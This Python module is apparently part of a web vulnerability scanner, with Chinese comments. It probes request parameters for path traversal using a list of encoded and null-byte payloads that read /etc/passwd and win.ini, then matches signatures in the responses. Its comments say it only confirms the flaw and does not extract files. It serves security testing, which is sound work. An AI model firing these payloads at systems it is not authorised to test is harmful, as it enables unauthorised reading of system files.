"""
路径穿越检测模块（主动 / 仅确认漏洞存在）
Author: 火柴 | GitHub: huocai250

用一组编码/绕过变体的穿越 payload 探测目标是否会返回受保护文件的
**特征标记**（如 /etc/passwd 的 root:x: 或 Windows boot.ini 段头），
以此**确认漏洞存在**。本模块只做存在性确认，不批量抓取/外带文件内容。

与 LFI 模块的区别：本模块聚焦「路径归一化绕过」变体（../、编码、null 字节等）。
"""
from core.scanner import BaseScanner
from core.colors import log
from utils.http import build_url

# 穿越绕过变体（聚焦编码/归一化绕过，数量精简）
TRAVERSALS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",     # 双重编码
    "/../../../../etc/passwd",
    "../../../../etc/passwd%00",               # null 字节截断
    "..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
]

# 命中即视为读取到受保护文件的证据
SIGNS = ["root:x:0:0:", "root:.*:0:0:", "\\[boot loader\\]",
         "\\[fonts\\]", "for 16-bit app support", "daemon:x:"]

TRAVERSAL_PARAMS = ["file", "path", "page", "template", "doc", "document",
                    "folder", "download", "read", "filename", "name", "view"]


class PathTraversalScanner(BaseScanner):
    name = "traversal"
    passive = False

    def run(self):
        log("INFO", "路径穿越检测（编码/归一化绕过，并发）...")
        targets = self.injection_targets(common_params=TRAVERSAL_PARAMS)
        self.map(self._test, targets)

    def _test(self, target):
        import re
        url, method, params, pname = target
        for payload in TRAVERSALS:
            test = dict(params)
            test[pname] = payload
            if method == "POST":
                r = self.post(url, data=test)
            else:
                r = self.get(build_url(url, test))
            if not r or not r.text:
                continue
            for sign in SIGNS:
                if re.search(sign, r.text):
                    log("VULN", f"[路径穿越] 参数: {pname} | {payload[:30]}")
                    self.add("路径穿越", "HIGH",
                             f"参数 '{pname}' 存在路径穿越，可读取受保护文件",
                             evidence=f"payload={payload} 命中特征 @ {url}", url=url)
                    return f"{pname}@{url}"
        return None
